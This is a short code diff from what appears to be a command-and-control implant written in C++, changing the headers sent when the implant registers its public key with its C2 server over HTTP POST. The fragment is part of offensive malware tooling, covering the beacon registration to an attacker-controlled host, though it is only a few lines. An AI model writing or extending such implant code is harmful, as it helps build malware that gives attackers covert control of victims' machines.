@@ -37,7 +37,7 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     PSIZE_T outSize = 0;
 
     // Register
-    string res = HTTPRequest(L"POST", serverUrl, toWide(REGISTER_ENDPOINT), C2_PORT, toWide(REGISTER_USER_AGENT), toWide(CONTENT_TYPE_JSON), (LPBYTE)key_json, strlen(key_json), outSize, USE_TLS);
+    string res = HTTPRequest(L"POST", serverUrl, toWide(REGISTER_ENDPOINT), C2_PORT, toWide(REGISTER_USER_AGENT), toWide(REGISTER_HEADERS), (LPBYTE)key_json, strlen(key_json), outSize, USE_TLS);
 
     // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
     DEBUG_PRINTF("Register response: %s\n", res.c_str());
